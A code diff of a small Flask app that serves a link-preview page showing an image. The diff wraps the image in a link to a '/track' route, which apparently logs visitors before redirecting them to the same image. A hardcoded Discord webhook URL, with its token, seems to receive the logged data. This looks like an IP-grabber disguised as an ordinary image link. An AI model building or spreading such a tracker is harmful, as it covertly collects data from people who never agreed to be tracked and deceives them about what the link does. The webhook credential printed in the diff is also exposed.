@@ -9,14 +9,15 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l
 
 @app.route('/')
 def og_image_preview():
-
     html = '''
     <html>
       <head>
         <meta property="og:image" content="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" />
       </head>
-      <body style="margin:0; padding:0;">
-        <img src="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" style="width:100vw; height:100vh; object-fit:contain;" />
+      <body>
+        <a href="/track">
+          <img src="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" style="width:100%;height:auto;" />
+        </a>
       </body>
     </html>
     '''
@@ -49,7 +50,5 @@ def track_and_redirect():
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host='0.0.0.0', port=port)
 
-
-    return redirect("https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180")
